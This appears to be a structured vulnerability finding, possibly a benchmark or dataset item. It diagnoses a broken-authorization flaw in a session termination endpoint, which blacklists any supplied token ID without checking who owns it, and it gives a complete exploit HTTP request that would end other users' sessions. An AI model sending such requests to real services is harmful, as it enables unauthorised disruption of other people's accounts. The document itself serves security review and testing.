diagnosis: The device session termination endpoint takes session_jti from the JSON payload and creates a BlacklistedToken record without ensuring the token belongs to request.user. An attacker can extract or enumerate JTIs to terminate sessions of arbitrary devices across other user accounts.
exploit_request:
DELETE /api/v1/auth/devices/session/ HTTP/1.1
Host: auth.smartapp.io
Authorization: Bearer <user_jwt>
Content-Type: application/json

{"session_jti": "a839f902-39c2-4820-98fe-d54b8a215392"}
